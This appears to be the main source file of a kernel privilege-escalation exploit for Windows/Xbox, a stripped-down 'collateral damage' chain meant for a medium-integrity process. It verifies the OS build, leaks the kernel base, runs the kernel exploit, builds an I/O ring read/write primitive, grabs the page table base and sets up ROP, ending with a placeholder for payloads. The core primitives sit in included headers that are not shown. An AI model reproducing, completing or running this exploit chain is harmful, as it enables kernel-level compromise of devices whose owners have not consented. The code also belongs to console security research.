/*
*
*   collat: emma's collateral damage exploit, stripped down to the kernel exploit to be loaded into a medium IL process
*           via landaire's reflective PE loader.
*       
*   pretty much, this eliminates the need for a kernel sidechannel and gamescript exploit, leaving us with a higher success rate,
*           and a faster exploit. overall, this just makes prototyping things easier, so it's not really intended for by use normal 
*           users (unless a token dispenser or any other cool service stuff is implemented)
* 
*/

#include <iostream>
#include <spdlog/spdlog.h>
#include <spdlog/sinks/stdout_color_sinks.h>
#include <format>
#include <memory>
//#include <fmt/color.h>

#include "nt_offsets.h"
#include "moduleinfo.h"
#include "kernel.h"
#include "hv.h"

#include "ioring.h"
#include "xbox_defs.h"

// pipes for ioring
#define GINPUT_PIPE_NAME "\\\\.\\pipe\\CollatSIn"
#define GOUTPUT_PIPE_NAME "\\\\.\\pipe\\CollatSOut"

#define _CRT_SECURE_NO_WARNINGS

bool g_Initialized = false;
HANDLE g_MainThread = INVALID_HANDLE_VALUE;

std::string gethex(char* input, size_t size) {
    std::ostringstream hexStream;

    for (size_t i = 0; i < size; ++i) {
        hexStream << std::hex << std::setw(2) << std::setfill('0')
            << (static_cast<int>(static_cast<unsigned char>(input[i])));
        if (i < size - 1) {
            hexStream << " ";
        }
    }

    return hexStream.str();
}

int main(int argc, char* argv[])
{
    bool skipVersionCheck = false;

    auto logger = spdlog::stdout_color_mt("collat");
    spdlog::set_default_logger(logger);

    spdlog::info("collat-stripped started! (pid: {})", GetCurrentProcessId());

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0) {
            spdlog::set_level(spdlog::level::trace);
            spdlog::debug("debug logging enabled!");
        }

        if (strcmp(argv[i], "-s") == 0) {
            skipVersionCheck = true;
        }
    }

    int buildRevision = collat::nt::get_build_revision();
    spdlog::info("os build revision: {}", buildRevision);
    if (!collat::nt::build_supported() && !skipVersionCheck) {
        spdlog::critical("uh-oh, you're running an unsupported build!");
        exit(0x70000001);
    }

    if (collat::kmodule::init_module_dictionary() != 0)
        exit(0x70000002);

    void* kernelBase = collat::kmodule::get_base("ntoskrnl.exe");
    spdlog::info("kernel base: {}", kernelBase);


    if (!collat::kernel::init_exploit((uint64_t)kernelBase)) {
        spdlog::critical("kernel exploit failed, aborting!");
        exit(0x70000003);
    }

    collat::kernel::create_ioring();

    collat::kernel::fetch_debug_block_keys(kernelBase);

    collat::kmodule::init_exports_map();

    if (!collat::kernel::fetch_pagetable_base()) {
        spdlog::critical("failed to grab pagetable base address, aborting!");
        exit(0x70000004);
    }

    if (!collat::kernel::init_rop())
        exit(0x70000005);

    spdlog::info("initialization complete, many crashes to follow! :)");
    
    // shenanigans go here

exit:
    collat::kernel::destroy_ioring();
    
    return 0;
}

